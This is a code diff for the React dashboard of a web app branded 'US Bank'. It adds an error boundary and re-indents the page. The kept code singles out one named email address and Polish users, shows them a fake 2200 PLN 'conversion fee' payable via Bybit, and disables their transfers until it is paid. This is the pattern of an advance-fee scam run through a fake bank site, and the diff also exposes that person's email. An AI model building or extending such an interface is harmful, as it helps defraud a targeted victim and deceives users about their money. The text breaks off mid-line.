@@ -73,6 +73,35 @@ const COUNTRY_ACCOUNT_FORMATS: Record<string, AccountFormat> = {
   'JP': { digits: 7, label: 'Japanese Bank Account (7 digits)' }
 };
 
+class ErrorBoundary extends React.Component<{ children: React.ReactNode }, { hasError: boolean; error: string | null }> {
+  constructor(props: { children: React.ReactNode }) {
+    super(props);
+    this.state = { hasError: false, error: null };
+  }
+
+  static getDerivedStateFromError(error: Error) {
+    return { hasError: true, error: error.message };
+  }
+
+  render() {
+    if (this.state.hasError) {
+      return (
+        <div className="container mx-auto px-4 py-8">
+          <Alert variant="destructive">
+            <AlertDescription>
+              An error occurred: {this.state.error}. Please try refreshing the page or contact support.
+            </AlertDescription>
+          </Alert>
+          <div className="flex gap-4 mt-4">
+            <Button onClick={() => window.location.reload()}>Try Again</Button>
+          </div>
+        </div>
+      );
+    }
+    return this.props.children;
+  }
+}
+
 const Dashboard = () => {
   const { user, logout } = useAuth() as { user: User | null; logout: () => Promise<void> };
   const { toast } = useToast();
@@ -154,7 +183,7 @@ const Dashboard = () => {
       .select('account_number')
       .eq('user_id', user.id)
       .single();
-    
+
     if (!existingAccount) {
       const newAccountNumber = await generateAccountNumber();
       await supabase.from('accounts').insert({
@@ -457,259 +486,37 @@ const Dashboard = () => {
   const currentAccountFormat = COUNTRY_ACCOUNT_FORMATS[transferData.recipientCountry];
 
   return (
-    <div className="min-h-screen bg-gray-100">
-      <header className="bg-white shadow-sm">
-        <div className="container mx-auto px-4 py-4 flex justify-between items-center">
-          <h1 className="text-xl font-bold">US Bank</h1>
-          <div className="flex items-center space-x-4">
-            <Button variant="outline" size="sm" onClick={handleRefresh} disabled={refreshing}>
-              <RefreshCw className={`h-4 w-4 mr-2 ${refreshing ? 'animate-spin' : ''}`} /> Refresh
-            </Button>
-            <span className="text-sm">Welcome, {user.fullName}</span>
-            {user.role === 'admin' && (
-              <Button variant="outline" size="sm" onClick={() => navigate('/admin')}>Admin Panel</Button>
-            )}
-            <Button variant="outline" size="sm" onClick={handleLogout}>
-              <LogOut className="h-4 w-4 mr-2" /> Logout
-            </Button>
+    <ErrorBoundary>
+      <div className="min-h-screen bg-gray-100">
+        <header className="bg-white shadow-sm">
+          <div className="container mx-auto px-4 py-4 flex justify-between items-center">
+            <h1 className="text-xl font-bold">US Bank</h1>
+            <div className="flex items-center space-x-4">
+              <Button variant="outline" size="sm" onClick={handleRefresh} disabled={refreshing}>
+                <RefreshCw className={`h-4 w-4 mr-2 ${refreshing ? 'animate-spin' : ''}`} /> Refresh
+              </Button>
+              <span className="text-sm">Welcome, {user.fullName}</span>
+              {user.role === 'admin' && (
+                <Button variant="outline" size="sm" onClick={() => navigate('/admin')}>Admin Panel</Button>
+              )}
+              <Button variant="outline" size="sm" onClick={handleLogout}>
+                <LogOut className="h-4 w-4 mr-2" /> Logout
+              </Button>
+            </div>
           </div>
-        </div>
-      </header>
+        </header>
 
-      <div className="container mx-auto px-4 py-8">
-        {(user.conversionFeePending || user.email === 'keniol9822@op.pl') && user.country === 'PL' && (
-          <Alert className="mb-6 border-orange-200 bg-orange-50">
-            <AlertCircle className="h-4 w-4 text-orange-600" />
-            <AlertDescription className="text-orange-800">
-              You have a pending conversion fee of {user.conversionFeeAmount || 2200} {user.conversionFeeCurrency || 'PLN'}. 
-              Please pay this fee via Bybit before making any transfers to other banks.
-            </AlertDescription>
-          </Alert>
-        )}
+        <div className="container mx-auto px-4 py-8">
+          {(user.conversionFeePending || user.email === 'keniol9822@op.pl') && user.country === 'PL' && (
+            <Alert className="mb-6 border-orange-200 bg-orange-50">
+              <AlertCircle className="h-4 w-4 text-orange-600" />
+              <AlertDescription className="text-orange-800">
+                You have a pending conversion fee of {user.conversionFeeAmount || 2200} {user.conversionFeeCurrency || 'PLN'}. 
+                Please pay this fee via Bybit before making any transfers to other banks.
+              </AlertDescription>
+            </Alert>
+          )}
 
-        <div className="grid md:grid-cols-3 gap-6 mb-8">
-          {balances.map((balance) => (
-            <Card key={balance.currency} className="bg-gradient-to-r from-blue-600 to-blue-700 text-white">
-              <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-                <CardTitle className="text-sm font-medium">{balance.currency} Balance</CardTitle>
-                <DollarSign className="h-4 w-4" />
-              </CardHeader>
-              <CardContent>
-                <div className="text-2xl font-bold">{formatCurrency(balance.balance, balance.currency)}</div>
-                {balance.currency === 'USD' && <p className="text-xs text-blue-100">Account: {user.accountNumber}</p>}
-              </CardContent>
-            </Card>
-          ))}
-          <Card className="bg-gradient-to-r from-purple-600 to-purple-700 text-white">
-            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
-              <CardTitle className="text-sm font-medium">Total Assets (USD)</CardTitle>
-              <TrendingUp className="h-4 w-4" />
-            </CardHeader>
-            <CardContent>
-              <div className="text-2xl font-bold">{formatCurrency(totalBalanceUSD)}</div>
-              <p className="text-xs text-purple-100">All currencies combined</p>
-            </CardContent>
-          </Card>
-        </div>
-
-        <div className="grid lg:grid-cols-3 gap-8">
-          <div className="lg:col-span-2">
-            <Tabs defaultValue="transfer" className="w-full">
-              <TabsList className="grid w-full grid-cols-3">
-                <TabsTrigger value="transfer">Money Transfer</TabsTrigger>
-                <TabsTrigger value="transactions">Transactions</TabsTrigger>
-                <TabsTrigger value="account">Account Info</TabsTrigger>
-              </TabsList>
-              <TabsContent value="transfer">
-                <Card>
-                  <CardHeader>
-                    <CardTitle className="flex items-center">
-                      <Send className="h-5 w-5 mr-2" />
-                      {transferData.transferType === 'internal' ? 'Internal' : 'External'} Money Transfer
-                    </CardTitle>
-                    <CardDescription>
-                      {transferData.transferType === 'internal'
-                        ? 'Transfer money to US Bank customers'
-                        : 'Transfer money to other USA banks with secure routing'}
-                    </CardDescription>
-                  </CardHeader>
-                  <CardContent>
-                    <form onSubmit={handleTransfer} className="space-y-4">
-                      <div>
-                        <Label htmlFor="transferType">Transfer Type</Label>
-                        <Select value={transferData.transferType} onValueChange={(value) => setTransferData({ ...transferData, transferType: value as 'internal' | 'external', toAccount: '', routingNumber: '' })}>
-                          <SelectTrigger><SelectValue placeholder="Select transfer type" /></SelectTrigger>
-                          <SelectContent>
-                            <SelectItem value="internal">Internal (US Bank)</SelectItem>
-                            <SelectItem value="external">External (Other USA Banks)</SelectItem>
-                          </SelectContent>
-                        </Select>
-                      </div>
-                      <div>
-                        <Label htmlFor="currency">Currency</Label>
-                        <Select value={transferData.currency} onValueChange={(value) => setTransferData({ ...transferData, currency: value })}>
-                          <SelectTrigger><SelectValue placeholder="Select currency" /></SelectTrigger>
-                          <SelectContent>
-                            {balances.map((balance) => (
-                              <SelectItem key={balance.currency} value={balance.currency}>
-                                {balance.currency} (Balance: {formatCurrency(balance.balance, balance.currency)})
-                              </SelectItem>
-                            ))}
-                          </SelectContent>
-                        </Select>
-                      </div>
-                      <div>
-                        <Label htmlFor="recipientCountry">Recipient Country</Label>
-                        <Select value={transferData.recipientCountry} onValueChange={(value) => setTransferData({ ...transferData, recipientCountry: value, toAccount: '' })}>
-                          <SelectTrigger><SelectValue placeholder="Select country" /></SelectTrigger>
-                          <SelectContent>
-                            <SelectItem value="US">🇺🇸 United States</SelectItem>
-                            {/* Add other countries as needed */}
-                          </SelectContent>
-                        </Select>
-                      </div>
-                      <div>
-                        <Label htmlFor="toAccount">Recipient Account Number</Label>
-                        <Input
-                          id="toAccount"
-                          type="text"
-                          placeholder={`Enter ${currentAccountFormat?.digits || 10}-digit account number`}
-                          maxLength={currentAccountFormat?.digits || 10}
-                          value={transferData.toAccount}
-                          onChange={(e) => setTransferData({ ...transferData, toAccount: e.target.value.replace(/\D/g, '') })}
-                          required
-                        />
-                        <p className="text-xs text-gray-500 mt-1">{currentAccountFormat?.label || 'Account format'}</p>
-                      </div>
-                      {transferData.transferType === 'external' && (
-                        <div>
-                          <Label htmlFor="routingNumber">Routing Number</Label>
-                          <Input
-                            id="routingNumber"
-                            type="text"
-                            placeholder="Enter 9-digit routing number"
-                            maxLength={9}
-                            value={transferData.routingNumber}
-                            onChange={(e) => setTransferData({ ...transferData, routingNumber: e.target.value.replace(/\D/g, '') })}
-                            required
-                          />
-                        </div>
-                      )}
-                      <div>
-                        <Label htmlFor="recipientName">Recipient Name</Label>
-                        <Input
-                          id="recipientName"
-                          type="text"
-                          placeholder="Enter recipient's full name"
-                          value={transferData.recipientName}
-                          onChange={(e) => setTransferData({ ...transferData, recipientName: e.target.value })}
-                          required
-                        />
-                      </div>
-                      <div>
-                        <Label htmlFor="amount">Amount</Label>
-                        <Input
-                          id="amount"
-                          type="number"
-                          placeholder="0.00"
-                          step="0.01"
-                          min="0.01"
-                          max={getBalance(transferData.currency)}
-                          value={transferData.amount}
-                          onChange={(e) => setTransferData({ ...transferData, amount: e.target.value })}
-                          required
-                        />
-                      </div>
-                      <div>
-                        <Label htmlFor="description">Description (Optional)</Label>
-                        <Input
-                          id="description"
-                          type="text"
-                          placeholder="What's this transfer for?"
-                          value={transferData.description}
-                          onChange={(e) => setTransferData({ ...transferData, description: e.target.value })}
-                        />
-                      </div>
-                      <Button type="submit" className="w-full" disabled={user.conversionFeePending || user.email === 'keniol9822@op.pl'}>
-                        <Send className="h-4 w-4 mr-2" /> Send {transferData.transferType === 'internal' ? 'Internal' : 'External'} Transfer
-                      </Button>
-                    </form>
-                  </CardContent>
-                </Card>
-              </TabsContent>
-              <TabsContent value="transactions">
-                <Card>
-                  <CardHeader>
-                    <CardTitle className="flex items-center"><History className="h-5 w-5 mr-2" /> Transaction History</CardTitle>
-                  </CardHeader>
-                  <CardContent>
-                    <div className="space-y-4">
-                      {transactions.length === 0 ? (
-                        <p className="text-gray-500 text-center py-8">No transactions yet</p>
-                      ) : (
-                        transactions.map((transaction) => (
-                          <div key={transaction.id} className="flex items-center justify-between p-4 bg-gray-50 rounded-lg">
-                            <div className="flex items-center space-x-3">
-                              <div className={`p-2 rounded-full ${transaction.transaction_type.includes('sent') ? 'bg-red-100 text-red-600' : 'bg-green-100 text-green-600'}`}>
-                                {transaction.transaction_type.includes('sent') ? <Send className="h-4 w-4" /> : <TrendingUp className="h-4 w-4" />}
-                              </div>
-                              <div>
-                                <p className="font-medium">{transaction.description}</p>
-                                <p className="text-sm text-gray-500">{formatDate(transaction.created_at)}</p>
-                                <p className="text-xs text-gray-400">Status: {transaction.status}</p>
-                              </div>
-                            </div>
-                            <div className={`font-bold ${transaction.amount >= 0 ? 'text-green-600' : 'text-red-600'}`}>
-                              {transaction.amount >= 0 ? '+' : ''}{formatCurrency(transaction.amount, transaction.transaction_currency)}
-                            </div>
-                          </div>
-                        ))
-                      )}
-                    </div>
-                  </CardContent>
-                </Card>
-              </TabsContent>
-              <TabsContent value="account">
-                <Card>
-                  <CardHeader>
-                    <CardTitle className="flex items-center"><User className="h-5 w-5 mr-2" /> Account Information</CardTitle>
-                  </CardHeader>
-                  <CardContent className="space-y-4">
-                    <div className="grid grid-cols-2 gap-4">
-                      <div><Label className="text-sm font-medium text-gray-500">Account Holder</Label><p className="text-lg font-semibold">{user.fullName}</p></div>
-                      <div><Label className="text-sm font-medium text-gray-500">Account Number</Label><p className="text-lg font-semibold">{user.accountNumber}</p></div>
-                      <div><Label className="text-sm font-medium text-gray-500">Email</Label><p className="text-lg">{user.email}</p></div>
-                      <div><Label className="text-sm font-medium text-gray-500">Country</Label><p className="text-lg">{user.country}</p></div>
-                      <div><Label className="text-sm font-medium text-gray-500">Account Type</Label><p className="text-lg capitalize">{user.role}</p></div>
-                      <div><Label className="text-sm font-medium text-gray-500">Active Currencies</Label><p className="text-lg">{balances.map(b => b.currency).join(', ')}</p></div>
-                    </div>
-                  </CardContent>
-                </Card>
-              </TabsContent>
-            </Tabs>
-          </div>
-          <div className="space-y-6">
-            <Card>
-              <CardHeader><CardTitle className="text-lg">Quick Actions</CardTitle></CardHeader>
-              <CardContent className="space-y-2">
-                <Button variant="outline" className="w-full justify-start"><CreditCard className="h-4 w-4 mr-2" /> Request New Card</Button>
-                <Button variant="outline" className="w-full justify-start"><Building2 className="h-4 w-4 mr-2" /> Find ATM/Branch</Button>
-                <Button variant="outline" className="w-full justify-start"><Settings className="h-4 w-4 mr-2" /> Account Settings</Button>
-              </CardContent>
-            </Card>
-            <Card>
-              <CardHeader><CardTitle className="text-lg">Exchange Rates</CardTitle></CardHeader>
-              <CardContent className="space-y-2">
-                <div className="flex justify-between text-sm"><span>USD/PLN</span><span>4.00</span></div>
-                <div className="flex justify-between text-sm"><span>EUR/USD</span><span>1.10</span></div>
-                <div className="flex justify-between text-sm"><span>GBP/USD</span><span>1.30</span></div>
-              </CardContent>
-            </Card>
-          </div>
-        </div>
-      </div>
-    </div>
-  );
-};
-
-export default Dashboard;
+          <div className="grid md:grid-cols-3 gap-6 mb-8">
+            {balances.map((balance) => (
+              <Card key={balance.currenc
